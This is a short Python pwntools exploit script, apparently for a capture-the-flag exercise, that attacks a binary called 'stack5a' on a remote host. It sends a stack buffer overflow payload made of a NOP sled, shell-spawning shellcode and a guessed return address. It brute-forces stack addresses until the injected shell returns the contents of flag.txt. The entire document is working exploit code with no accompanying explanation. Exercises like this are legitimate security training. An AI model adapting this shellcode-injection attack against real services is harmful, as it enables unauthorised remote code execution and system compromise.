from pwn import *

elf = context.binary = ELF('./stack5a')

offset  = 136

shellcode = asm(shellcraft.sh())
nopsled = offset - len(shellcode) - (len(shellcode) - 8)
nops = b'\x90' * nopsled
padding = b"A" * (len(shellcode) - 8)
command = b"cat flag.txt"

payload  = nops
payload += shellcode
payload += padding

for base in range(0x7ffffffff000, 0x7ffffffde000, -nopsled):
    log.info(f"===> {base:x}")

    buffer = base - (offset + 8)
    jmptarget = buffer + nopsled // 2

    io = remote('lettieri.iet.unipi.it', 4405)
    io.recvline() # discard the header
    io.sendline(payload + p64(jmptarget))
    
    time.sleep(0.1)
    io.sendline(command)
    try:
        repl = io.recvline(timeout = 5)
        if b"SNH" in repl:
            log.success(repl.decode())
            break
    except:
        pass
    io.close()
io.interactive()